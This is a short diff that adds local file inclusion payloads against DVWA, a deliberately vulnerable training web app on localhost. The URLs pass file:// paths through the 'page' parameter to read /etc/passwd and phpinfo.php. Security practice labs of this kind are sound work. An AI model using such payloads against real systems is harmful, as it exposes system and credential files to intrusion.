@@ -1,0 +1,6 @@
+page=file:///var/www/html/dvwa/phpinfo.php
+
+http://localhost/vulnerabilities/fi/?page=file:///etc/passwd
+
+http://localhost/vulnerabilities/fi/?page=file:///var/www/html/phpinfo.php
+
